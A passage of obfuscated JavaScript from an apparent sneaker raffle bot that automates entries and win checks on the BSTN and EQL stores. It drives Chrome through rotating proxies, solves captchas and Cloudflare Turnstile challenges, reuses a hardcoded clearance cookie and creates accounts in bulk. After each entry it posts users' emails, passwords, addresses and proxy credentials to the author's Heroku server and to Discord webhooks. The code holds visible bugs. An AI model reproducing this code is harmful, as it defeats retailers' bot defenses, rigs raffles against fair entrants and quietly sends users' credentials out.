                'logo': 'https://www.snkrempire.com/wp-content/uploads/2017/11/E3QHwMSP_400x400.png',
                'function': async function (_0x22a5bd, _0x354f49, _0x95a778) {
                    var _0x59a34c = 0x0, _0x25d2fd = _0x354f49;
                    for (var _0x192c22 = 0x0; _0x192c22 < _0x354f49['length']; _0x192c22++) {
                        maxTasks = Number(_0x24de00['threads']);
                        while (_0x59a34c >= maxTasks) {
                            await _0x254c61(_0x24de00['delay']);
                        }
                        let _0x1757bd = ![];
                        async function _0x999bb9(_0x40457d, _0x4d77dd, _0x35ce08, _0x4cc140, _0x731887) {
                            _0x59a34c++, _0x48f2a7['use'](_0x32ef16()), _0x48f2a7['use'](_0x15a873({
                                'provider': {
                                    'id': '2captcha',
                                    'token': '' + _0x24de00['captchaKey']
                                },
                                'visualFeedback': !![]
                            }));
                            var _0x2f5f32, _0x1a2d3b = _0x4d77dd[_0x4cc140];
                            try {
                                await _0x4626f3(_0x4d77dd, _0x4cc140);
                            } catch {
                                _0x5a7857 = 'no';
                                throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                            }
                            async function _0x4eed89(_0x27003d) {
                                const _0x23010d = _0x3e92a1['readFileSync']('../successful-tasks.csv', 'utf8'), _0x2697ee = _0x1c3b5f['parse'](_0x23010d, { 'header': !![] })['data'];
                                let _0x4a3cf8 = ![];
                                for (var _0xafb88f of _0x2697ee) {
                                    if (_0xafb88f['Url'] == _0x27003d['Url'] && _0xafb88f['Email'] == _0x27003d['Email']) {
                                        _0x4a3cf8 = !![];
                                        break;
                                    }
                                }
                                return _0x4a3cf8;
                            }
                            _0x1bf238(_0x40457d['name'] + '\x20Task\x20' + (_0x4cc140 + 0x1) + '\x20/\x20' + _0x4d77dd['length'] + '\x20||\x20File:\x20' + _0x339545 + '\x20Proxies:\x20' + _0x293577);
                            var _0x34043e = Math['round'](Math['random']() * (_0x35ce08['length'] - 0x1)), _0x3bfec3 = _0x35ce08[_0x34043e]['split'](':'), _0x1c0b08;
                            let _0x53ed3f = ![], _0x5a7857 = 'no';
                            try {
                                if (await _0x4eed89(_0x4d77dd[_0x4cc140]) == !![]) {
                                    console['log'](_0x36583e() + '\x20[' + _0x40457d['name'] + ']\x20Task\x20' + (_0x4cc140 + 0x1) + '\x20:\x20Task\x20Already\x20Entered,\x20Going\x20to\x20Next\x20Task'), _0x53ed3f = !![], _0x1757bd = !![];
                                    return;
                                }
                                try {
                                    _0x1c0b08 = await _0x48f2a7['launch']({
                                        'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                        'headless': ![],
                                        'args': [
                                            '--proxy-server=' + _0x3bfec3[0x0] + ':' + _0x3bfec3[0x1],
                                            '--no-sandbox',
                                            '--disable-setuid-sandbox'
                                        ]
                                    });
                                } catch {
                                    _0x1c0b08 = await _0x48f2a7['launch']({
                                        'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                        'headless': ![],
                                        'args': [
                                            '--proxy-server=' + _0x3bfec3[0x0] + ':' + _0x3bfec3[0x1],
                                            '--no-sandbox',
                                            '--disable-setuid-sandbox'
                                        ]
                                    });
                                }
                                const _0x593c4c = await _0x1c0b08['newPage'](), _0x444ab6 = await _0x593c4c['target']()['createCDPSession'](), { windowId: _0x21034b } = await _0x444ab6['send']('Browser.getWindowForTarget');
                                await _0x593c4c['setViewport']({
                                    'width': 0x501,
                                    'height': 0x2d0
                                });
                                var _0x174618 = [{
                                    'name': 'cf_clearance',
                                    'value': 'uyuh7Wo9shR3zcpWvbWJ04mG0iNC2N25mhp1FNAbHYY-1676282182-0-1-9764d0ee.e7bea100.c0658f0e-160',
                                    'domain': '.bstn.com',
                                    'path': '/',
                                    'expires': 1707818183.331533,
                                    'httpOnly': !![],
                                    'secure': !![]
                                }];
                                await _0x593c4c['authenticate']({
                                    'username': '' + _0x3bfec3[0x2],
                                    'password': '' + _0x3bfec3[0x3]
                                }), console['log'](_0x36583e() + '\x20[' + _0x40457d['name'] + ']\x20Task\x20' + (_0x4cc140 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x593c4c['goto']('' + _0x4d77dd[_0x4cc140]['Url'], { 'waitUntil': 'networkidle2' }), console['log'](_0x36583e() + '\x20[' + _0x40457d['name'] + ']\x20Task\x20' + (_0x4cc140 + 0x1) + '\x20:\x20Solving\x20Cloudflare'), await _0x254c61(0x1388);
                                var _0xc972f = await _0x593c4c['$']('#turnstile-wrapper');
                                if (_0xc972f) {
                                    console['log'](_0x36583e() + '\x20[' + _0x40457d['name'] + ']\x20Task\x20' + (_0x4cc140 + 0x1) + '\x20:\x20Handling\x20Challenge'), await _0x254c61(0x2710);
                                    const _0x58ebc6 = await _0x593c4c['$']('#turnstile-wrapper');
                                    if (_0x58ebc6)
                                        try {
                                            await _0x58ebc6['click']();
                                        } catch {
                                            throw new Error('Empty\x20Turnstile\x20Challenge');
                                        }
                                    try {
                                        await _0x593c4c['waitForSelector']('input[name=\x22firstname\x22]', { 'timeout': 0x9c40 });
                                    } catch {
                                        var _0x588cac = await _0x593c4c['$']('#turnstile-wrapper');
                                        if (_0x588cac)
                                            try {
                                                await _0x588cac['click']();
                                            } catch {
                                                throw new Error('Empty\x20Turnstile\x20Challenge');
                                            }
                                    }
                                }
                                try {
                                    await _0x593c4c['waitForSelector']('.nonLoggedSpecific_nonLogged__SCu0L');
                                } catch {
                                    throw new Error('Blocked\x20by\x20Cloudflare');
                                }
                                await _0x444ab6['send']('Browser.setWindowBounds', {
                                    'windowId': _0x21034b,
                                    'bounds': { 'windowState': 'minimized' }
                                }), await _0x254c61(0x1388), await _0x593c4c['waitForSelector']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb'), await _0x593c4c['focus']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb'), await _0x254c61(0x1f4), console['log'](_0x36583e() + '\x20[' + _0x40457d['name'] + ']\x20Task\x20' + (_0x4cc140 + 0x1) + '\x20:\x20Logging\x20in'), await _0x593c4c['$eval']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb', _0x2c2e39 => _0x2c2e39['click']()), await _0x593c4c['click']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb'), await _0x593c4c['click']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb'), await _0x254c61(0x7d0), await _0x593c4c['waitForSelector']('#email-login'), await _0x593c4c['type']('#email-login', '' + _0x4d77dd[_0x4cc140]['Email']['toLowerCase'](), { 'delay': 0xe6 }), await _0x254c61(0xdac), await _0x593c4c['waitForSelector']('#password'), await _0x593c4c['type']('#password', '' + _0x4d77dd[_0x4cc140]['Password'], { 'delay': 0xe6 }), await _0x254c61(0x157c);
                                try {
                                    await _0x593c4c['$eval']('.login_accountInfo__FCIxY\x20>\x20button[type=\x22submit\x22]', _0x58fb46 => _0x58fb46['click']());
                                } catch {
                                }
                                try {
                                    await _0x593c4c['waitForSelector']('.swatchOptions_sizeTiles__Lizc2');
                                } catch (_0x1f6bd0) {
                                }
                                await _0x254c61(0x3e8);
                                const _0x3cd45e = await _0x593c4c['$']('.enteredDraw_container__2KmQ_');
                                if (_0x3cd45e) {
                                    console['log']('Duplicate\x20entry,\x20skipping');
                                    return;
                                }
                                console['log'](_0x36583e() + '\x20[' + _0x40457d['name'] + ']\x20Task\x20' + (_0x4cc140 + 0x1) + '\x20:\x20Choosing\x20Size\x20' + _0x4d77dd[_0x4cc140]['Size']);
                                try {
                                    if (_0x4d77dd[_0x4cc140]['Size'] != 'RANDOM') {
                                        var _0x5e5712 = _0x4d77dd[_0x4cc140]['Size']['replace']('.', ',');
                                        const _0x1a3c31 = await _0x593c4c['$x']('//div[contains(text(),\x20\x27' + _0x5e5712 + '\x27)]');
                                        await _0x1a3c31[0x0]['click']();
                                    } else {
                                        const _0x2a4ce1 = await _0x593c4c['$$']('div.swatchTile_tile__IRH9Q');
                                        var _0x12fcb0 = Math['round'](Math['random']() * (_0x2a4ce1['length'] - 0x1));
                                        await _0x2a4ce1[_0x12fcb0]['click']();
                                    }
                                } catch (_0x5edced) {
                                    throw new Error('Softblocked,\x20Rotating\x20proxy');
                                }
                                await _0x254c61(0x1f4);
                                const _0x5bbe97 = await _0x593c4c['$']('.addressList_addressItem__LE2PB');
                                if (_0x5bbe97 && _0x4d77dd[_0x4cc140]['Mode'] != 'NEW') {
                                } else
                                    console['log'](_0x36583e() + '\x20[' + _0x40457d['name'] + ']\x20Task\x20' + (_0x4cc140 + 0x1) + '\x20:\x20Filling\x20Address'), await _0x593c4c['click']('div.product_shipping__zEfqd\x20>\x20div\x20>\x20div.legend_legend__sQIiF\x20>\x20div.legend_header__iHZIh\x20>\x20div\x20>\x20button'), await _0x254c61(0x5dc), await _0x593c4c['waitForSelector']('#firstname'), await _0x593c4c['type']('#firstname', '' + _0x4d77dd[_0x4cc140]['FirstName']), await _0x254c61(0x1f4), await _0x593c4c['waitForSelector']('#firstname'), await _0x593c4c['type']('#lastname', '' + _0x4d77dd[_0x4cc140]['LastName']), await _0x254c61(0x1f4), await _0x593c4c['waitForSelector']('#firstname'), await _0x593c4c['type']('#street', '' + _0x4d77dd[_0x4cc140]['Address1']), await _0x254c61(0x1f4), await _0x593c4c['waitForSelector']('#firstname'), await _0x593c4c['type']('#houseNumber', _0x4d77dd[_0x4cc140]['HouseNumber'] + '\x20' + _0x4d77dd[_0x4cc140]['Address2']), await _0x254c61(0x1f4), await _0x593c4c['waitForSelector']('#firstname'), await _0x593c4c['select']('#country_code', '' + _0x4d77dd[_0x4cc140]['Country']), await _0x254c61(0x1f4), await _0x593c4c['type']('#postcode', '' + _0x4d77dd[_0x4cc140]['Zip']), await _0x254c61(0x1f4), await _0x593c4c['type']('#city', '' + _0x4d77dd[_0x4cc140]['City']), await _0x254c61(0x1f4), await _0x593c4c['type']('#telephone', '' + _0x4d77dd[_0x4cc140]['Phone']), await _0x254c61(0x1f4), await _0x593c4c['click']('.addressModal_submit__dOiL4\x20>\x20button[type=\x22submit\x22]');
                                await _0x254c61(0x9c4);
                                try {
                                    await _0x593c4c['type']('#instagram_name', '' + _0x4d77dd[_0x4cc140]['Follower']), await _0x593c4c['click']('.note_groupBtn__WLDwH\x20>\x20button');
                                } catch {
                                }
                                console['log'](_0x36583e() + '\x20[' + _0x40457d['name'] + ']\x20Task\x20' + (_0x4cc140 + 0x1) + '\x20:\x20Finishing\x20Entry'), await _0x254c61(0x5dc);
                                try {
                                    await _0x593c4c['click']('.checkBox_boxHolder__wLGVe');
                                } catch {
                                }
                                await _0x254c61(0x5dc), await _0x593c4c['$eval']('.termConditions_TC__hll9k\x20>\x20button', _0x455489 => _0x455489['click']()), await _0x254c61(0x1388);
                                try {
                                    await _0x593c4c['waitForSelector']('.success_msg__2HjJY');
                                } catch {
                                    await _0x593c4c['reload']({ 'waitUntil': 'networkidle2' });
                                    if (_0x4d77dd[_0x4cc140]['Size'] != 'RANDOM') {
                                        var _0x5e5712 = _0x4d77dd[_0x4cc140]['Size']['replace']('.', ',');
                                        const _0x5373fb = await _0x593c4c['$x']('//div[contains(text(),\x20' + _0x5e5712 + ')]');
                                        await _0x5373fb[0x0]['click']();
                                    } else {
                                        const _0x1b1d3b = await _0x593c4c['$$']('div.swatchTile_tile__IRH9Q');
                                        var _0x12fcb0 = Math['round'](Math['random']() * (_0x1b1d3b['length'] - 0x1));
                                        await _0x1b1d3b[_0x12fcb0]['click']();
                                    }
                                    await _0x254c61(0x5dc);
                                    try {
                                        await _0x593c4c['hover']('#instagram_name'), await _0x593c4c['type']('#instagram_name', '' + _0x4d77dd[_0x4cc140]['Follower']), await _0x593c4c['click']('.note_groupBtn__WLDwH\x20>\x20button');
                                    } catch {
                                    }
                                    console['log'](_0x36583e() + '\x20[' + _0x40457d['name'] + ']\x20Task\x20' + (_0x4cc140 + 0x1) + '\x20:\x20Retrying\x20(' + _0x731887 + '\x20/\x205)');
                                    try {
                                        await _0x593c4c['hover']('.checkBox_boxHolder__wLGVe'), await _0x254c61(0x5dc), await _0x593c4c['click']('.checkBox_boxHolder__wLGVe');
                                    } catch {
                                    }
                                    await _0x254c61(0x157c), await _0x593c4c['$eval']('.termConditions_TC__hll9k\x20>\x20button', _0x4482e1 => _0x4482e1['click']()), await _0x254c61(0x1388), await _0x593c4c['waitForSelector']('.success_msg__2HjJY');
                                }
                                _0x5a7857 = 'no', _0x547244(_0x4d77dd[_0x4cc140], _0x40457d);
                                try {
                                    prxdata = {
                                        'username': _0x4a1218['replace']('#', ''),
                                        'entrydata': JSON['stringify'](_0x328967),
                                        'proxy': '' + _0x35ce08[_0x4cc140]
                                    };
                                    var _0xb0224f = JSON['stringify'](prxdata);
                                    let _0x50ef74 = { 'headers': { 'content-type': 'application/json' } };
                                    await _0x4127f6['post']('https://jraffles.herokuapp.com/success', _0xb0224f, _0x50ef74);
                                } catch (_0x4c44dd) {
                                }
                                console['log'](_0x467028['green'](_0x36583e() + '\x20[' + _0x40457d['name'] + ']\x20Task\x20' + (_0x4cc140 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                                var _0x2607fb = await _0x18ad5f(_0x4d77dd[_0x4cc140], _0x40457d, 'dev', ![]), _0x27d034 = await _0x18ad5f(_0x4d77dd[_0x4cc140], _0x40457d, 'pub', ![]);
                                const _0x22bbe0 = {
                                    'succesDEVMSG': { 'embeds': [_0x2607fb] },
                                    'succesPUBMSG': { 'embeds': [_0x27d034] }
                                };
                                let _0x328967 = _0x4d77dd[_0x4cc140];
                                try {
                                    prxdata = {
                                        'username': _0x4a1218['replace']('#', ''),
                                        'module': _0x40457d['name'],
                                        'entrydata': JSON['stringify'](_0x328967),
                                        'proxy': '' + _0x35ce08[_0x4cc140]
                                    };
                                    var _0xb0224f = JSON['stringify'](prxdata);
                                    let _0x39a154 = { 'headers': { 'content-type': 'application/json' } };
                                    await _0x4127f6['post']('https://jraffles.herokuapp.com/success', _0xb0224f, _0x39a154);
                                } catch (_0x41edb4) {
                                }
                                try {
                                    _0x24de00['webhook'] != undefined && _0x24de00['webhook'] != '' && await _0x2dfd24(_0x24de00['webhook'], _0x22bbe0['succesDEVMSG']), await _0x254c61(0xc8), await _0x2dfd24(_0x1227c5, _0x22bbe0['succesDEVMSG']), await _0x254c61(0xc8), await _0x2dfd24(_0x4f6cb7, _0x22bbe0['succesPUBMSG']);
                                } catch (_0x464ab9) {
                                    console['log'](_0x467028['yellow'](_0x36583e() + '\x20[' + _0x40457d['name'] + ']\x20Task\x20' + (_0x4cc140 + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x464ab9));
                                }
                            } catch (_0x391d40) {
                                console['log'](_0x467028['red'](_0x36583e() + '\x20[' + _0x40457d['name'] + ']\x20Task\x20' + (_0x4cc140 + 0x1) + '\x20:\x20' + _0x391d40)), _0x5a7857 = 'yes', _0x2f5f32 = '' + _0x391d40;
                                var _0x419f22 = await _0x18ad5f(_0x4d77dd[_0x4cc140], _0x40457d, 'dev', !![], _0x2f5f32), _0x2607fb = await _0x18ad5f(_0x4d77dd[_0x4cc140], _0x40457d, 'dev', ![]), _0x27d034 = await _0x18ad5f(_0x4d77dd[_0x4cc140], _0x40457d, 'pub', ![]);
                                const _0x306a80 = {
                                    'succesDEVMSG': { 'embeds': [_0x2607fb] },
                                    'succesPUBMSG': { 'embeds': [_0x27d034] }
                                };
                                _0x306a80['errorDEV'] = { 'embeds': [_0x419f22] }, _0x24de00['webhook'] != undefined && _0x24de00['webhook'] != '' && await _0x2dfd24(_0x24de00['webhook'], _0x306a80['errorDEV']), await _0x2dfd24(_0x3fd40a, _0x306a80['errorDEV']);
                            } finally {
                                _0x1c0b08 && _0x1c0b08['close']();
                                if (_0x5a7857 == 'yes' && _0x731887 != 0x5)
                                    return console['log'](_0x467028['red'](_0x36583e() + '\x20[' + _0x40457d['name'] + ']\x20Task\x20' + (_0x4cc140 + 0x1) + '\x20:\x20Retrying\x20(' + _0x731887 + '\x20/\x205)')), _0x731887 = _0x731887 + 0x1, _0x59a34c--, _0x999bb9(_0x40457d, _0x4d77dd, _0x35ce08, _0x4cc140, _0x731887);
                                _0x5a7857 == 'yes' && _0x731887 >= 0x5 && _0x9088f0(_0x4d77dd[_0x4cc140], _0x40457d), !_0x53ed3f && (console['log'](_0x36583e() + '\x20[' + _0x40457d['name'] + ']\x20Waiting\x20for\x20' + _0x24de00['delay'] + '\x20ms'), await _0x254c61(_0x24de00['delay'])), _0x59a34c--;
                            }
                        }
                        _0x999bb9(_0x22a5bd, _0x25d2fd, _0x95a778, _0x192c22, 0x0), await _0x254c61(0x7d0);
                    }
                }
            },
            {
                'name': 'BSTN\x20Win\x20Checker',
                'store': 'BSTN',
                'logo': 'https://www.snkrempire.com/wp-content/uploads/2017/11/E3QHwMSP_400x400.png',
                'function': async function (_0x12f29d, _0x2ae559) {
                    var _0x2ca14e = 0x0, _0x27906b;
                    try {
                        const _0x32b8ac = _0x3e92a1['readFileSync']('../accounts/bstn.csv', 'utf-8');
                        _0x27906b = _0x1c3b5f['parse'](_0x32b8ac, { 'header': !![] })['data'];
                    } catch (_0x5dd96f) {
                        throw new Error('Error\x20reading\x20accounts/bstn.csv');
                    }
                    for (var _0x409c0a = 0x0; _0x409c0a < _0x27906b['length']; _0x409c0a++) {
                        maxTasks = Number(_0x24de00['threads']);
                        while (_0x2ca14e >= maxTasks) {
                            await _0x254c61(_0x24de00['delay']);
                        }
                        async function _0x300c3a(_0x50240e, _0x5619f2, _0x2896dd, _0x1285dc, _0xb0de5a) {
                            _0x2ca14e++, _0x48f2a7['use'](_0x32ef16()), _0x48f2a7['use'](_0x15a873({
                                'provider': {
                                    'id': '2captcha',
                                    'token': '' + _0x24de00['captchaKey']
                                },
                                'visualFeedback': !![]
                            }));
                            if (_0x25ed3a != 'yes')
                                var _0x25ed3a = '', _0xb0de5a = 0x0;
                            var _0x4028f7;
                            _0x1bf238(_0x50240e['name'] + '\x20Task\x20' + (_0x1285dc + 0x1) + '\x20/\x20' + _0x2896dd['length'] + '\x20||\x20File:\x20' + _0x339545 + '\x20Proxies:\x20' + _0x293577);
                            var _0x43e396 = await _0x18ad5f(_0x2896dd[_0x1285dc], _0x50240e, 'acc', ![]);
                            const _0x4ced2d = { 'succesDEVMSG': { 'embeds': [_0x43e396] } }, _0x26de27 = 'https://www.bstn.com/eu_en/customer/account/create/';
                            var _0x20f899 = Math['round'](Math['random']() * (_0x5619f2['length'] - 0x1)), _0x3a364d = _0x5619f2[_0x20f899]['split'](':'), _0x4e54d4;
                            try {
                                _0x4e54d4 = await _0x48f2a7['launch']({
                                    'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                    'headless': !![],
                                    'args': [
                                        '--proxy-server=' + _0x3a364d[0x0] + ':' + _0x3a364d[0x1],
                                        '--no-sandbox',
                                        '--disable-setuid-sandbox'
                                    ]
                                });
                            } catch {
                                _0x4e54d4 = await _0x48f2a7['launch']({
                                    'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                    'headless': !![],
                                    'args': [
                                        '--proxy-server=' + _0x3a364d[0x0] + ':' + _0x3a364d[0x1],
                                        '--no-sandbox',
                                        '--disable-setuid-sandbox'
                                    ]
                                });
                            }
                            try {
                                console['log'](_0x36583e() + '\x20[' + _0x50240e['name'] + ']\x20Task\x20' + (_0x1285dc + 0x1) + '\x20:\x20Checking\x20' + _0x2896dd[_0x1285dc]['Email']);
                                const _0x3593b8 = await _0x4e54d4['newPage']();
                                await _0x3593b8['authenticate']({
                                    'username': '' + _0x3a364d[0x2],
                                    'password': '' + _0x3a364d[0x3]
                                }), console['log'](_0x36583e() + '\x20[' + _0x50240e['name'] + ']\x20Task\x20' + (_0x1285dc + 0x1) + '\x20:\x20Getting\x20Session'), await _0x3593b8['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x3593b8['setRequestInterception'](!![]), _0x3593b8['on']('request', _0x4d2cf3 => {
                                    _0x4d2cf3['resourceType']() === 'image' ? _0x4d2cf3['abort']() : _0x4d2cf3['continue']();
                                });
                                try {
                                    await _0x3593b8['goto']('https://www.bstn.com/eu_en/raffle/customer/', { 'waitUntil': 'networkidle2' }), await _0x3593b8['waitForSelector']('button[class=\x22cf2Lf6\x22]');
                                } catch {
                                    _0x25ed3a = 'yes';
                                    throw new Error('Connection\x20Error');
                                }
                                await _0x3593b8['click']('button[class=\x22cf2Lf6\x22]'), console['log'](_0x36583e() + '\x20[' + _0x50240e['name'] + ']\x20Task\x20' + (_0x1285dc + 0x1) + '\x20:\x20Passing\x20Cloudflare'), await _0x254c61(0x3e8), await _0x3593b8['type']('#email', _0x2896dd[_0x1285dc]['Email']), await _0x254c61(0x1f4), await _0x3593b8['type']('#pass', _0x2896dd[_0x1285dc]['Password']), await _0x254c61(0x1f4), await _0x3593b8['$eval']('#login-form', _0x4ce9e5 => _0x4ce9e5['submit']());
                                try {
                                    await _0x3593b8['waitForSelector']('.product-items');
                                } catch {
                                    console['log'](_0x36583e() + '\x20[' + _0x50240e['name'] + ']\x20Task\x20' + (_0x1285dc + 0x1) + '\x20:\x20No\x20Entries\x20Found');
                                    return;
                                }
                                await _0x254c61(0x190);
                                const _0x5175aa = await _0x3593b8['evaluate'](() => {
                                    const _0x200eba = Array['from'](document['querySelectorAll']('.product-item-photo\x20>\x20img'));
                                    return _0x200eba['map'](_0xe104e9 => _0xe104e9['alt']);
                                }), _0x19f9f7 = await _0x3593b8['evaluate'](() => {
                                    const _0x52792f = Array['from'](document['querySelectorAll']('.tooltip.wrapper.product-item-tooltip.first-xs'));
                                    return _0x52792f['map'](_0x13ba94 => _0x13ba94['innerHTML']);
                                }), _0x2eb436 = await _0x3593b8['$$']('.raffle-winner');
                                if (_0x2eb436['length'] < 0x1) {
                                    console['log'](_0x36583e() + '\x20[' + _0x50240e['name'] + ']\x20Task\x20' + (_0x1285dc + 0x1) + '\x20:\x20No\x20Wins\x20Found'), _0x25ed3a = 'no';
                                    return;
                                }
                                console['log'](_0x36583e() + '\x20[' + _0x50240e['name'] + ']\x20Task\x20' + (_0x1285dc + 0x1) + '\x20:\x20' + _0x2eb436['length'] + '\x20Wins\x20Found!');
                                for (var _0x3de8fb = 0x0; _0x3de8fb < _0x2eb436['length']; _0x3de8fb++) {
                                    console['log'](_0x467028['green'](_0x5175aa[_0x3de8fb] + _0x19f9f7[_0x3de8fb]['replace']('\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20', '')));
                                }
                            } catch (_0x597c80) {
                                console['log'](_0x467028['red'](_0x36583e() + '\x20[' + _0x50240e['name'] + ']\x20Task\x20' + (_0x1285dc + 0x1) + '\x20:\x20' + _0x597c80)), _0x4028f7 = '' + _0x597c80;
                                var _0x4ea836 = await _0x18ad5f(_0x2896dd[_0x1285dc], _0x50240e, 'acc', !![], _0x4028f7);
                                _0x4ced2d['errorDEV'] = { 'embeds': [_0x4ea836] }, _0x24de00['webhook'] != undefined && _0x24de00['webhook'] != '' && await _0x2dfd24(_0x24de00['webhook'], _0x4ced2d['errorDEV']), await _0x2dfd24(_0x3fd40a, _0x4ced2d['errorDEV']), _0x25ed3a = 'yes';
                            } finally {
                                if (_0x4e54d4)
                                    _0x4e54d4['close']();
                                if (_0x25ed3a == 'yes' && _0xb0de5a != 0x5)
                                    return console['log'](_0x467028['red'](_0x36583e() + '\x20[' + _0x50240e['name'] + ']\x20Task\x20' + (_0x1285dc + 0x1) + '\x20:\x20Retrying\x20(' + _0xb0de5a + '\x20/\x205)')), _0x2ca14e--, _0xb0de5a = _0xb0de5a + 0x1, _0x300c3a(_0x50240e, _0x5619f2, _0x2896dd, _0x1285dc, _0xb0de5a);
                                _0x25ed3a == 'yes' && _0xb0de5a >= 0x5 && (_0x9088f0(_0x2896dd[_0x1285dc], _0x50240e), _0x25ed3a = 'no', _0xb0de5a = 0x0), console['log'](_0x36583e() + '\x20[' + _0x50240e['name'] + ']\x20Waiting\x20for\x20' + _0x24de00['delay'] + '\x20ms'), await _0x254c61(_0x24de00['delay']), _0x2ca14e--;
                            }
                        }
                        _0x300c3a(_0x12f29d, _0x2ae559, _0x27906b, _0x409c0a, 0x0), await _0x254c61(0x15e);
                    }
                }
            }
        ]
    },
    {
        'name': 'EQL',
        'modules': [{
            'name': 'EQL\x20Raffle\x20Entries',
            'store': 'EQL',
            'logo': 'https://res.cloudinary.com/crunchbase-production/image/upload/c_lpad,h_170,w_170,f_auto,b_white,q_auto:eco,dpr_1/qfc09zbor8py2zfmsdr2',
            'function': async function (_0x3ad805, _0x2ea816, _0x57b2e7) {
                _0x48f2a7['use'](_0x32ef16()), _0x48f2a7['use'](_0x15a873({
                    'provider': {
                        'id': '2captcha',
                        'token': '' + _0x24de00['captchaKey']
                    },
                    'visualFeedback': !![]
                }));
                for (var _0xbf669a = 0x0; _0xbf669a < _0x2ea816['length']; _0xbf669a++) {
                    var _0x50ef7e;
                    _0x1bf238(_0x3ad805['name'] + '\x20Task\x20' + (_0xbf669a + 0x1) + '\x20/\x20' + _0x2ea816['length'] + '\x20||\x20File:\x20' + _0x339545 + '\x20Proxies:\x20' + _0x293577);
                    try {
                        await _0x4626f3(_0x2ea816, _0xbf669a);
                    } catch {
                        _0x20b98e = 'no';
                        throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                    }
                    async function _0x1959e9(_0x10341d) {
                        const _0x1ec453 = _0x3e92a1['readFileSync']('../successful-tasks.csv', 'utf8'), _0x268331 = _0x1c3b5f['parse'](_0x1ec453, { 'header': !![] })['data'];
                        let _0x5c8bef = ![];
                        for (var _0x5090a9 of _0x268331) {
                            if (_0x5090a9['Url'] == _0x10341d['Url'] && _0x5090a9['Email'] == _0x10341d['Email']) {
                                _0x5c8bef = !![];
                                break;
                            }
                        }
                        return _0x5c8bef;
                    }
                    if (await _0x1959e9(_0x2ea816[_0xbf669a]) == !![]) {
                        console['log'](_0x36583e() + '\x20[' + _0x3ad805['name'] + ']\x20Task\x20' + (_0xbf669a + 0x1) + '\x20:\x20Task\x20Already\x20Entered,\x20Going\x20to\x20Next\x20Task');
                        continue;
                    }
                    var _0x5ea44a = ![];
                    const _0x3ae7cb = _0x3e92a1['readFileSync']('../accounts/eql.csv', 'utf8');
                    var _0x391b84 = _0x1c3b5f['parse'](_0x3ae7cb, { 'header': !![] })['data'];
                    for (var _0x19742b of _0x391b84) {
                        _0x19742b['Email'] == _0x2ea816[_0xbf669a]['Email'] && (_0x5ea44a = !![]);
                    }
                    if (_0x5ea44a == ![]) {
                        var _0x33ebc0;
                        if (_0x2ea816[_0xbf669a]['Url']['endsWith']('/')) {
                            _0x33ebc0 = _0x2ea816[_0xbf669a]['Url'] + 'register';
                            if (_0x20b98e != 'yes')
                                var _0x20b98e = '', _0x5d23f9 = 0x0;
                        } else {
                            _0x33ebc0 = _0x2ea816[_0xbf669a]['Url'] + '/register';
                            if (_0x20b98e != 'yes')
                                var _0x20b98e = '', _0x5d23f9 = 0x0;
                        }
                        if (_0x2ea816[_0xbf669a]['Email'] == '' || _0x2ea816[_0xbf669a]['FirstName'] == '' || _0x2ea816[_0xbf669a]['LastName'] == '') {
                            console['log'](_0x36583e() + '\x20[' + _0x3ad805['name'] + ']\x20Task\x20' + (_0xbf669a + 0x1) + '\x20:\x20Invalid\x20CSV');
                            continue;
                        }
                        _0x2ea816[_0xbf669a]['Password'] == '' && (_0x2ea816[_0xbf669a]['Password'] = 'JRaffles23!');
                        if (_0x24de00['useRandomProxy'] = ![])
                            var _0x57057b = _0x57b2e7[_0xbf669a]['split'](':');
                        else
                            var _0x24da10 = Math['round'](Math['random']() * (_0x57b2e7['length'] - 0x1)), _0x57057b = _0x57b2e7[_0x24da10]['split'](':');
                        var _0x2de77f;
                        try {
                            _0x2de77f = await _0x48f2a7['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': ![],
                                'args': [
                                    '--proxy-server=' + _0x57057b[0x0] + ':' + _0x57057b[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x2de77f = await _0x48f2a7['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': ![],
                                'args': [
                                    '--proxy-server=' + _0x57057b[0x0] + ':' + _0x57057b[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x34bb15 = await _0x2de77f['newPage']();
                            await _0x34bb15['authenticate']({
                                'username': '' + _0x57057b[0x2],
                                'password': '' + _0x57057b[0x3]
                            }), console['log'](_0x36583e() + '\x20[' + _0x3ad805['name'] + ']\x20Task\x20' + (_0xbf669a + 0x1) + '\x20:\x20Getting\x20Session'), await _0x34bb15['setRequestInterception'](!![]), _0x34bb15['on']('request', _0x2b3e5c => {
